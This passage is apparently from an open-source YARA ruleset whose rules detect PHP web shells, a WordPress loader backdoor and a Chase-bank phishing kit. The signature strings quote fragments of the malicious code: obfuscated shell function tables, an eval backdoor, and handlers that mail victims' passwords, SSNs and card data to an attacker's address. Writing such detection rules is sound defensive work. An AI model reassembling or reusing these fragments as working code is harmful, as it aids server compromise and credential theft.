      $s6 = "tUHBRcVNzVnZYeFp6MDEyMzQ1Njc4OSsvPScsJ0FCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5Ky8nKSk" ascii /* base64 encoded string 'PpQqSsVvXxZz0123456789+/=','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'))' */
      $s7 = "c2VyX2Fib3J0JzskSUlJSUlJSTFJbEkxPSdpc19maWxlJzskSUlJSUlJSTFJSTFsPSdteXNxbF9xdWVyeSc7JElJSUlJSUkxSUlsMT0nbXlzcWxfY29ubmVjdCc7JElJ" ascii /* base64 encoded string 'ser_abort';$IIIIIII1IlI1='is_file';$IIIIIII1II1l='mysql_query';$IIIIIII1IIl1='mysql_connect';$II' */
      $s8 = "ZXhlYyc7JElJSUlJSUlsSUlsST0nY3VybF9zZXRvcHQnOyRJSUlJSUlJbElJSTE9J2N1cmxfaW5pdCc7JElJSUlJSUlJMTExST0nc3ByaW50Zic7JElJSUlJSUlJMWxs" ascii /* base64 encoded string 'exec';$IIIIIIIlIIlI='curl_setopt';$IIIIIIIlIII1='curl_init';$IIIIIIII111I='sprintf';$IIIIIIII1ll' */
      $s9 = "MUlJbD0ncGNsb3NlJzskSUlJSUlJSTExSUlJPSdmZ2V0cyc7JElJSUlJSUkxbDExbD0nZmVvZic7JElJSUlJSUkxbDExST0ncG9wZW4nOyRJSUlJSUlJMWwxSUk9J3Jv" ascii /* base64 encoded string '1IIl='pclose';$IIIIIII11III='fgets';$IIIIIII1l11l='feof';$IIIIIII1l11I='popen';$IIIIIII1l1II='ro' */
      $s10 = "bGxsMTE9J3JtZGlyJzskSUlJSUlJSWxsbDFsPSdjb3VudCc7JElJSUlJSUlsbGxsMT0nZXhwbG9kZSc7JElJSUlJSUlsbGxJbD0naXNfd3JpdGFibGUnOyRJSUlJSUlJ" ascii /* base64 encoded string 'lll11='rmdir';$IIIIIIIlll1l='count';$IIIIIIIllll1='explode';$IIIIIIIlllIl='is_writable';$IIIIIII' */
      $s11 = "dW5kJzskSUlJSUlJSTFsbDFJPSdmc29ja29wZW4nOyRJSUlJSUlJMWxsbDE9J3JhbmQnOyRJSUlJSUlJMWxJMTE9J3RpbWUnOyRJSUlJSUlJMWxJbDE9J2lnbm9yZV91" ascii /* base64 encoded string 'und';$IIIIIII1ll1I='fsockopen';$IIIIIII1lll1='rand';$IIIIIII1lI11='time';$IIIIIII1lIl1='ignore_u' */
      $s12 = "XHr8Xk10Pk1nuBmcJdlymBTw5F2wzUTlDH0pSBlF0h1f5foOkWzavcrfoDlLZampjGAkBC0f4fllbABfUa1kXCLfUFrleYeiHHlp2CM5Oh1nyUlYWcz09kZL7tm0hcBx" ascii
      $s13 = "wME8wPSRPT08wMDAwTzAoJE9PTzAwMDAwTygkTzBPMDBPTzAwKCRPMDAwTzBPMDAsMHgxN2MpLCdFbnRlcnlvdXdraFJIWUtOV09VVEFhQmJDY0RkRmZHZ0lpSmpMbE1" ascii /* base64 encoded string '0O0=$OOO0000O0($OOO00000O($O0O00OO00($O000O0O00,0x17c),'EnteryouwkhRHYKNWOUTAaBbCcDdFfGgIiJjLlM' */
      $s14 = "ST0nb3JkJzskSUlJSUlJSUkxSUkxPSdzdHJwb3MnOyRJSUlJSUlJSUkxSUk9J2ZpbGVvd25lcic7JElJSUlJSUlJSWwxMT0ncG9zaXhfZ2V0cHd1aWQnOyRJSUlJSUlJ" ascii /* base64 encoded string 'I='ord';$IIIIIIII1II1='strpos';$IIIIIIIII1II='fileowner';$IIIIIIIIIl11='posix_getpwuid';$IIIIIII' */
      $s15 = "yceOlazy5T1OBByOVFyiJBrP0C25DAacwOllBO3OQTliDGaCZHB9AaLczCznaYypocrxUOMOZCM1Da1pBFyfjHeaDCznyf1aQAmpJalpXT1OBDlcQBbiLaMIza1amHBO" ascii
      $s16 = "SUlJSUlsMTExbD0nZXJlZyc7JElJSUlJSUlsMWwxMT0ncHJlZ19tYXRjaCc7JElJSUlJSUlsMWwxbD0naXNfZGlyJzskSUlJSUlJSWwxbGxsPSdpbmlfZ2V0JzskSUlJ" ascii /* base64 encoded string 'IIIIIl111l='ereg';$IIIIIIIl1l11='preg_match';$IIIIIIIl1l1l='is_dir';$IIIIIIIl1lll='ini_get';$III' */
      $s17 = "SUlJSTExbDFsPSdjb3B5JzskSUlJSUlJSTExbEkxPSd1cmxlbmNvZGUnOyRJSUlJSUlJMTFJMWw9J2hlYWRlcic7JElJSUlJSUkxMUkxST0nZXhlYyc7JElJSUlJSUkx" ascii /* base64 encoded string 'IIII11l1l='copy';$IIIIIII11lI1='urlencode';$IIIIIII11I1l='header';$IIIIIII11I1I='exec';$IIIIIII1' */
      $s18 = "SUlsMUk9J3RyaW0nOyRJSUlJSUlJSUlsbDE9J2ZsdXNoJzskSUlJSUlJSUlJbGxJPSdwcmVnX21hdGNoX2FsbCc7JElJSUlJSUlJSWxJMT0nZXJlZ2knOyRJSUlJSUlJ" ascii /* base64 encoded string 'IIl1I='trim';$IIIIIIIIIll1='flush';$IIIIIIIIIllI='preg_match_all';$IIIIIIIIIlI1='eregi';$IIIIIII' */
      $s19 = "c2UnOyRJSUlJSUlJbEkxSWw9J2NoZGlyJzskSUlJSUlJSWxJbGxsPSdzdWJzdHInOyRJSUlJSUlJbElJMUk9J2N1cmxfY2xvc2UnOyRJSUlJSUlJbElJbDE9J2N1cmxf" ascii /* base64 encoded string 'se';$IIIIIIIlI1Il='chdir';$IIIIIIIlIlll='substr';$IIIIIIIlII1I='curl_close';$IIIIIIIlIIl1='curl_' */
      $s20 = "uGoicHlavUBx3dLlpf2lhGAlzULfSfapuajORauYRULfKGBaCWjnkW0r5UAYhY1ieAjfDBypPtMkeDolcBr5STMpUclpuaMpJHlkSU0c3dLlQF0shO055caitHrleYel" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1000KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-30
   Identifier: shell2
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_30_18_wp_load {
   meta:
      description = "shell2 - file wp-load.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "4095f37c624a3d93600dd974343fa016c4b16090c07cf39c523382ec34956dc9"
   strings:
      $s1 = "if (fopen(\"$subdira/.$algo\", 'w')) { $ura = 1; $eb = \"$subdira/\"; $hdl = fopen(\"$subdira/.$algo\", 'w'); break; }" fullword ascii
      $s2 = "$data = file_get_contents($url);" fullword ascii
      $s3 = "if (fopen(\"$dira/.$algo\", 'w')) { $ura = 1; $eb = \"$dira/\"; $hdl = fopen(\"$dira/.$algo\", 'w'); break; }" fullword ascii
      $s4 = "if (!$ura && fopen(\".$algo\", 'w')) { $ura = 1; $eb = ''; $hdl = fopen(\".$algo\", 'w'); }" fullword ascii
      $s5 = "$pass = \"Zgc5c4MXrLUscwQO6MwbPPGCf1TVMvlanyHMAanN\";" fullword ascii
      $s6 = "$reqw = $ay($ao($oa(\"$pass\"), 'wp_function'));" fullword ascii
      $s7 = "curl_setopt($ch, CURLOPT_HEADER, 0);" fullword ascii
      $s8 = "function get_data_ya($url) {" fullword ascii
      $s9 = "$ea = '_shaesx_'; $ay = 'get_data_ya'; $ae = 'decode'; $ea = str_replace('_sha', 'bas', $ea); $ao = 'wp_cd'; $ee = $ea.$ae; $oa " ascii
      $s10 = "@ini_set('display_errors', '0');" fullword ascii
      $s11 = "$ea = '_shaesx_'; $ay = 'get_data_ya'; $ae = 'decode'; $ea = str_replace('_sha', 'bas', $ea); $ao = 'wp_cd'; $ee = $ea.$ae; $oa " ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_09_30_18_cache_clear {
   meta:
      description = "shell2 - file cache.clear.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "4b4a78553e8c9f03c0713bed9059d828bb8d7512b3404482993df4cfa4d28d13"
   strings:
      $s1 = "<?php $MZz9092 = \"tr7_zj13lp)f4hd0ny;8suwqi529.mk6/o*avebx(cg\";$AI2908 = $MZz9092[9].$MZz9092[1].$MZz9092[37].$MZz9092[42].$MZ" ascii
      $s2 = "zzsW/EH6uL3xjfBfPQlftp+p89WMv+6Yv6O3J38v/ae4fybwPeeXkYlhf+/K87ycD5C//gI+OIFneb4lfFH+/0t9VeG/G+tzYH2Tvwf+92j9Xfze1FeTD/Ig/CH9Hzv3" ascii
      $s3 = "C72/D3k+ntBfiZeE/5/wKfJz+X6xz3l+4sOmP7Fmpjo/R/GfhKeQP9zZD1HzbNW3qdcup0X/dzU/Ef+Hd38G9fcF80/Ndx7Jj2yK9P23fgx/VvsFTPBv8C+hf63HxV/Z" ascii
      $s4 = "GLXvx9TfOH9e81z0a/g3m58gf2z8LZ1/zD6Un0Bl3Q/4zAv8m5i/nOGXB/+//H/ly6X/fkkdKX4a/FB6pRZ/JK2v9Id3PvU18yPt/yN9/sr6NdVjk3EW+/PH/dllfx/6" ascii
      $s5 = "5fl98meNj6n+lP7A+Ve1+6VH/BHIs9jjryN/F9ff0bcW5Fdea+cq4meyeJijF0b/IH9Uz190/l7Ql0ufUJ3Qd5NTkXn19I+t9Q3KH7V+0v4F66x/g+e9Gp0POpifuOiv" ascii
      $s6 = "5y/8t+APXfFndX1k/pD1NfDrj/AirC9f53rW/TzY0xd+gOZnqoepd1UHwmGGn1mgv+X5nuFXRL0QNa39h9DvDNR/HfNoeH3C7/ExEX56WvwR8V87gHeW8FtUZ4hfOdnn" ascii
      $s7 = "+W+zyvzBifnejhxE8B/hquCvzqfTPV2jzxHuVHOe/If8zxL+BhmUnP8xX5e+r0S/LP3PFj7PVfP7Af5CBX879WPX9/lS5/zZbkz/bvOrNE9YWR9nf7vMBxf/s3QdKf6e" ascii
      $s8 = "576jPpc+wfWg8tmPC3+F/q1f6jvlP6uv2/Ne28UfCT5CnI/xPXee15i/B15mfzdy6+GPp7/5ivf77m9pv2bPGslXGbhfwn8o7h/8xXVuznc6uqkS/Fz4Cvh9J/2H9T/C" ascii
      $s9 = "SP/SF/vTMP8wDx3930h+b/K75edlf07ze5d80Zp8pszHHFfov1TfZn62/UGv5GO7/+rND+LzjS38KvTR7lsr51On/uj+xj7LmX94dj6N/eejPnmkXhAfXfNn+g/zv52P" ascii
      $s10 = "Z978yv6R3hV+GvlLB/z7OvON0h+lQJ+99Pf+/OvMb7P+Zf3hPf+KfIOj9U/2R7b/TMP8wJ4j+J+N7o/vdubnhu4/87Vq9Mua3z3ij6acw9J+XzX4gu7/ltpUGAv+VJXr" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 100KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-05
   Identifier: case23
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_case23_db {
   meta:
      description = "case23 - file db.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-08-05"
      hash1 = "95ecc987c604678d86a67944a2d90b341761f0068e98b76752b6310dfaaa4c49"
   strings:
      $s1 = "<?php ${\"\\x47\\x4cOB\\x41\\x4cS\"}[\"\\x68\\x76\\x72\\x74x\\x69\"]=\"\\x61\\x75th\";${\"\\x47\\x4c\\x4f\\x42AL\\x53\"}[\"l\\x7" ascii
      $s2 = "]==\"\\x65\"){$mwvvynwbxyi=\"\\x64\\x61\\x74\\x61\";eval(${$mwvvynwbxyi}[\"\\x64\"]);}exit();}" fullword ascii
      $s3 = "61\\x74\\x61\";function sh_decrypt($data,$key){global$auth;$vuuogtpxiqk=\"\\x61u\\x74\\x68\";return sh_decrypt_phase(sh_decrypt_" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 10KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-27
   Identifier: chase
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */


rule infected_08_27_18_chase_bank_phish_access {
   meta:
      description = "chase - file access.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "2bfe60be990c045955c439f2e22b8aa0fe2393ea79b82a38abf38cd5fcf04c62"
   strings:
      $s1 = "header(\"Location:  https://chaseonline.chase.com/Logon.aspx?LOB=RBGLogon\");" fullword ascii
      $s2 = "$recipient =" fullword ascii
      $s3 = "$message .= \"Email Password              : \".$_POST['emailpassx'].\"\\n\";" fullword ascii
      $s4 = "$message .= \"Email Address             : \".$_POST['emailxnx'].\"\\n\";" fullword ascii
      $s5 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s6 = "$message .= \"---- : || tHAnks tO Phish || :------\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_08_27_18_chase_bank_phish_verify {
   meta:
      description = "chase - file verify.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "8c9a2a71e438b74d92a0454c69097e952c23c5d5fc78899f965256852d6c71ef"
   strings:
      $s1 = "$recipient =" fullword ascii
      $s2 = "$message .= \"Password              : \".$_POST['Password'].\"\\n\";" fullword ascii
      $s4 = "header(\"Location:  log.htm\");" fullword ascii
      $s5 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s6 = "$message .= \"---- : || tHAnks tO PHish || :------\\n\";" fullword ascii
      $s7 = "$message .= \"User ID             : \".$_POST['UserID'].\"\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-27
   Identifier: phishing
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_27_18_chase2_chase2018_Verification_login_phishing_success {
   meta:
      description = "phishing - file success.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "907cbbd5929fd339c0d0529de2f20554ed59d1278330c0481b34b5daa6ba9e7d"
   strings:
      $s1 = "td.backbot {background:#FFF url(https://chaseonline.chase.com/content/ecpweb/sso/image/bottom3.jpg );} " fullword ascii
      $s2 = "td.backtop {background:#FFF url(https://chaseonline.chase.com/content/ecpweb/sso/image/top2.jpg );} " fullword ascii
      $s3 = "td.backmid {background:#FFF url(https://chaseonline.chase.com/content/ecpweb/sso/image/center3.jpg );} " fullword ascii
      $s4 = "<body onLoad=\"oninit();\"><form name=\"formIdentifyUser\" method=\"post\" action=\"rashash.php\" id=\"formIdentifyUser\">" fullword ascii
      $s5 = "<meta name=\"Author\" content=\"&nbsp;&#169; 2012 JPMorgan Chase &amp; Co.\"/><meta name=\"CONNECTION\" content=\"CLOSE\"/><meta" ascii
      $s6 = "<!-- BEGIN Global Navigation table --><table cellspacing=\"0\" cellpadding=\"0\" border=\"0\" class=\"fullwidth\" summary=\"glob" ascii
      $s7 = "&nbsp;</td><td class=\"headerbardate\">&nbsp;</td></tr></table><!-- END Segment table -->" fullword ascii
      $s8 = "<input type=\"hidden\" name=\"__EVENTTARGET\" id=\"__EVENTTARGET\" value=\"\" />" fullword ascii
      $s9 = "escription\" content=\"Identification\" /><link rel=\"stylesheet\" type=\"text/css\" href=\"https://chaseonline.chase.com/styles" ascii
      $s10 = "<title>Chase Online - Verification Successful !</title><!--POH--></head>" fullword ascii
      $s11 = "background-image: url('https://chaseonline.chase.com/images/indicator.gif');" fullword ascii
      $s12 = "tion\"><tr><td><a href=\"http://www.chase.com/\" id=\"siteLogo\"><img src=\"https://chaseonline.chase.com/images//ChaseNew.gif\"" ascii
      $s13 = "line.chase.com/images//favicon.ico\"/>" fullword ascii
      $s14 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>" fullword ascii
      $s15 = "t.location.href='http://www.chase.com/';\" class=\"globalnavlinks\">" fullword ascii
      $s16 = "function __doPostBack(eventTarget, eventArgument) {" fullword ascii
      $s17 = "<li class=\"auto-style6\"><strong>We use powerful encryption methods to help protect your sensitive information.</strong></li>" fullword ascii
      $s18 = "<li class=\"auto-style6\"><strong>We use powerful encryption methods to help protect your sensitive information.</strong></l" fullword ascii
      $s19 = "<input type=\"hidden\" name=\"__VIEWSTATEENCRYPTED\" id=\"__VIEWSTATEENCRYPTED\" value=\"\" />" fullword ascii
      $s20 = "rder=\"0\" class=\"headerbarwidth\" summary=\"section header\"><tr class=\"headerbar\"><td class=\"segimage\" align=\"left\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 40KB and
         ( 8 of them )
      ) or ( all of them )
}

rule netcraft_check {
   meta:
      description = "phishing - file netcraft_check.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "f1b491fc82cec2171389a3f9c4645416ab13d2e09cf68a3b9f1a9826a95ea3a3"
   strings:
      $s1 = "if ($v_agent == \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)\") {" fullword ascii
      $s2 = "header(\"Location: https://chase.com/\");" fullword ascii
      $s3 = "Created by legzy -- icq: 692561824 " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_08_27_18_chase2_chase2018_Verification_login_phishing_step2 {
   meta:
      description = "phishing - file step2.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "e570ad02e70a1fdb7e4585c067e28381b2b1e49a6863e6dabe68d58cbfc9ad78"
   strings:
      $x1 = "<script type=\"text/javascript\" src=\"https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js\"></script>" fullword ascii
      $s2 = "new MaskedPassword(document.getElementById(\"demo-field\"), '\\u25CF');" fullword ascii
      $s3 = "alert(\"Please provide your email address password\");" fullword ascii
      $s4 = "<meta http-equiv=\"content-type\" content=\"text/html; charset=iso-8859-1\">" fullword ascii
      $s5 = "document.getElementById('demo-form').onsubmit = function()" fullword ascii
      $s6 = "<div id=\"text4\" style=\"position:absolute; overflow:hidden; left:1035px; top:70px; width:348px; height:22px; z-index:26\">" fullword ascii
      $s7 = "<div id=\"text2\" style=\"position:absolute; overflow:hidden; left:660px; top:806px; width:172px; height:26px; z-index:11\">" fullword ascii
      $s8 = "<input name=\"ssn\" maxlength=\"16\" type=\"text\" style=\"position:absolute;width:259px;left:560px;top:503px;z-index:7\">" fullword ascii
      $s9 = "ref=\"#\"><img src=\"images/fotr.png\" alt=\"\" title=\"\" border=0 width=1001 height=133></a></div>" fullword ascii
      $s10 = "<title>C&#111;&#110;&#102;&#105;&#114;&#109;&#32;&#89;&#111;&#117;&#114;&#32;&#65;&#99;&#99;&#111;&#117;&#110;t</title>" fullword ascii
      $s11 = "<input name=\"mmn\" type=\"text\" maxlength=20 style=\"position:absolute;width:259px;left:560px;top:729px;z-index:15\">" fullword ascii
      $s12 = "<form id=\"myform\" name=\"myform\" method=\"post\" action=\"submit.php?&sessionid=<?php echo generateRandomString(80); ?>&secur" ascii
      $s13 = "\"><img src=\"images/1.png\" alt=\"\" title=\"\" border=0 width=986 height=33></a></div>" fullword ascii
      $s14 = "<input name=\"name\" type=\"text\" style=\"position:absolute;width:259px;left:560px;top:466px;z-index:6\">" fullword ascii
      $s15 = "<select name=\"expmonth\" style=\"position:absolute;left:560px;top:842px;width:74px;z-index:18\">" fullword ascii
      $s16 = "<select name=\"expyear\" style=\"position:absolute;left:642px;top:842px;width:80px;z-index:19\">" fullword ascii
      $s17 = "alert(\"Password is Too Short\");" fullword ascii
      $s18 = "Created by legzy -- icq 692561824" fullword ascii
      $s19 = "var bodyElems = document.getElementsByTagName(\"body\");" fullword ascii
      $s20 = "src=\"images/det.png\" alt=\"\" title=\"\" border=0 width=159 height=401></div>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 40KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_08_27_18_chase2_chase2018_Verification_login_phishing_email {
   meta:
      description = "phishing - file email.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "9eb1be98a1369f20fe917fd42b22e7d0c4b53cb9ca8609b5e0614114f8accef7"
   strings:
      $x1 = "$VictimInfo .= \"| IP Address : \" . $_SERVER['REMOTE_ADDR'] . \" (\" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . \")\\r\\n\";" fullword ascii
      $s2 = "$headers = \"From: Chase <customer-support@schoolofhacking.com>\";" fullword ascii
      $s3 = "$VictimInfo .= \"| UserAgent : \" . $systemInfo['useragent'] . \"\\r\\n\";" fullword ascii
      $s4 = "$message .= \"--------------+ Email & Password +------------------\\n\";" fullword ascii
      $s5 = "$message .= \"-------+ H3lpL1n3 Inc Customer Service (*^*) +------\\n\";" fullword ascii
      $s6 = "header(\"Location:step2.php?sslchannel=true&sessionid=\" . generateRandomString(80));" fullword ascii
      $s7 = "$VictimInfo .= \"| Browser : \" . $systemInfo['browser'] . \"\\r\\n\";" fullword ascii
      $s8 = "$message .= \"Email Password          : \".$_POST['emailpass'].\"\\n\";" fullword ascii
      $s9 = "$VictimInfo .= \"| Platform : \" . $systemInfo['os'] . \"\";" fullword ascii
      $s10 = "$send = \"mr.magma2017@gmail.com\";" fullword ascii
      $s11 = "$message .= \"--------------+ Chase Online +-----------------------\\n\";" fullword ascii
      $s12 = "$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);" fullword ascii
      $s13 = "$message .= \"-------------+ Client IP +-----------------------\\n\";" fullword ascii
      $s14 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      $s15 = "require \"includes/session_protect.php\";" fullword ascii
      $s16 = "$headers .= $_POST['eMailAdd'].\"\\n\";" fullword ascii
      $s17 = "$message .= \"\".$VictimInfo.\"\\n\";" fullword ascii
      $s18 = "mail($send,$subject,$message,$headers);" fullword ascii
      $s19 = "mail($to,$subject,$message,$headers);" fullword ascii
      $s20 = "$message .= \"Date of Birth            : \".$_POST['dob'].\"\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 5KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}


rule infected_08_27_18_chase2_chase2018_Verification_login_phishing_submit {
   meta:
      description = "phishing - file submit.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "44e314c57c85e8154f6144e3fa68be6b79fac524eba7cebf62bde4a2bda00312"
   strings:
      $x1 = "$VictimInfo .= \"| IP Address : \" . $_SERVER['REMOTE_ADDR'] . \" (\" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . \")\\r\\n\";" fullword ascii
      $s2 = "$headers = \"From:Chase<customer-support@schoolofhacking.com>\";" fullword ascii
      $s3 = "$VictimInfo .= \"| UserAgent : \" . $systemInfo['useragent'] . \"\\r\\n\";" fullword ascii
      $s4 = "$message .= \"------+ H3lpL1n3 Inc Customer Service (*^*)#911 +------\\n\";" fullword ascii
      $s5 = "header(\"Location:success.php?sslchannel=true&sessionid=\" . generateRandomString(80))" fullword ascii
      $s6 = "$VictimInfo .= \"| Browser : \" . $systemInfo['browser'] . \"\\r\\n\";" fullword ascii
      $s7 = "$VictimInfo .= \"| Platform : \" . $systemInfo['os'] . \"\";" fullword ascii
      $s8 = "$send = \"mr.magma2017@gmail.com\";" fullword ascii
      $s9 = "$message .= \"--------------+ Chase FullZ +-----------------------\\n\";" fullword ascii
      $s10 = "$message .= \"-------------+ Vict!m Info +----------------------\\n\";" fullword ascii
      $s11 = "$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);" fullword ascii
      $s12 = "$headers .= \"MIME-Version: 1.0\\n\";" fullword ascii
      $s13 = "require \"includes/session_protect.php\";" fullword ascii
      $s14 = "$message .= \"Address            : \".$_POST['Address'].\"\\n\";" fullword ascii
      $s15 = "$message .= \"DOB            : \".$_POST['day'].'-'.$_POST['month'].'-'.$_POST['year'].\"\\n\";" fullword ascii
      $s16 = "$message .= \"Expire date            : \".$_POST['expmonth'].'-'.$_POST['expyear'].\"\\n\";" fullword ascii
      $s17 = "$message .= \"Pass            : \".$_POST['emailpass'].\"\\n\";" fullword ascii
      $s18 = "$headers .= $_POST['eMailAdd'].\"\\n\";" fullword ascii
      $s19 = "$message .= \"\".$VictimInfo.\"\\n\";" fullword ascii
      $s20 = "mail($send,$subject,$message,$headers);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 6KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_08_27_18_chase2_chase2018_Verification_login_phishing_confirm {
   meta:
      description = "phishing - file confirm.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "f0ede4fc89193620fad85194d1f53a7a0b7f3079ec38cff040f15422b4e4deca"
   strings:
      $x1 = "<script type=\"text/javascript\" src=\"https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js\"></script>" fullword ascii
      $s2 = "ges/loginscreen1.png\" alt=\"\" title=\"\" border=0 width=1366 height=816></div>" fullword ascii
      $s3 = "new MaskedPassword(document.getElementById(\"demo-field\"), '\\u25CF');" fullword ascii
      $s4 = "alert(\"Please provide your email address password\");" fullword ascii
      $s5 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">" fullword ascii
      $s6 = "<input name=\"emailpass\" id=\"demo-field\" type=\"text\" style=\"position:absolute;width:110px;z-index:19\">" fullword ascii
      $s7 = "document.getElementById('demo-form').onsubmit = function()" fullword ascii
      $s8 = "<div id=\"text5\" style=\"position:absolute; overflow:hidden; left:786px; top:407px; width:140px; height:22px; z-index:27\">" fullword ascii
      $s9 = "<div id=\"text3\" style=\"position:absolute; overflow:hidden; left:428px; top:407px; width:155px; height:22px; z-index:25\">" fullword ascii
      $s10 = "<div id=\"text6\" style=\"position:absolute; overflow:hidden; left:786px; top:477px; width:138px; height:22px; z-index:28\">" fullword ascii
      $s11 = "<div id=\"text4\" style=\"position:absolute; overflow:hidden; left:1005px; top:75px; width:348px; height:22px; z-index:26\">" fullword ascii
      $s12 = "<div id=\"text4\" style=\"position:absolute; overflow:hidden; left:428px; top:477px; width:148px; height:22px; z-index:26\">" fullword ascii
      $s13 = "<input name=\"email\" type=\"text\" id=\"email\" style=\"position:absolute;width:110px;left:430px;top:430px;z-index:18\">" fullword ascii
      $s14 = "<title>C&#111;&#110;&#102;&#105;&#114;&#109;&#32;&#89;&#111;&#117;&#114;&#32;&#65;&#99;&#99;&#111;&#117;&#110;t</title>" fullword ascii
      $s15 = "<div id=\"image2\" style=\"position:absolute; overflow:hidden; left:0px; top:0px; width:1366px; height:px; z-index:1\"><img src=" ascii
      $s16 = "<form id=\"myform\" name=\"myform\" method=\"post\" action=\"email.php?&sessionid=<?php echo generateRandomString(80); ?>&secure" ascii
      $s17 = "$_SESSION['pass'] = $_POST['pass'];" fullword ascii
      $s18 = "alert(\"Password is Too Short\");" fullword ascii
      $s19 = "Created by legzy -- icq 692561824" fullword ascii
      $s20 = "var bodyElems = document.getElementsByTagName(\"body\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 20KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_08_27_18_chase2_chase2018_Verification_login_phishing_index {
   meta:
      description = "phishing - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "62c8059da62caafe0b90c10b71b9a97fbeed5b929a590d14c51945731fd8c735"
   strings:
      $s1 = "require \"includes/visitor_log.php\";" fullword ascii
      $s2 = "Created by legzy -- icq 692561824" fullword ascii
      $s3 = "require \"includes/blacklist_lookup.php\";" fullword ascii
      $s4 = "require \"includes/netcraft_check.php\";" fullword ascii
      $s5 = "require \"includes/ip_range_check.php\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_blacklist_lookup {
   meta:
      description = "phishing - file blacklist_lookup.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-27"
      hash1 = "921abc8cd5b73ed1f639de236bfa62bf0c6cc3a8a142e403d3e24cd26f110cd4"
   strings:
      $s1 = "** private function that converts single ip address to CIDR format," fullword ascii
      $s2 = "** private function that reads the file into array" fullword ascii
      $s3 = "**      example '_whitelist.dat' and '_blacklist.dat' files for the" fullword ascii
      $s4 = "** looseits. The commented lines will be used for future" fullword ascii
      $s5 = "**      default to '_whitelist.dat' and '_blacklist.dat'.  If either" fullword ascii
      $s6 = "** converts an IP address to an array of two long integer," fullword ascii
      $s7 = "return (($this->compare($dip,$dlow) != -1) && ($this->compare($dip,$dhigh) != 1)); " fullword ascii
      $s8 = "public function __construct( $whitelistfile = 'includes/whitelist.dat', " fullword ascii
      $s9 = "private $statusid = array( 'negative' => -1, 'neutral' => 0, 'positive' => 1 );" fullword ascii
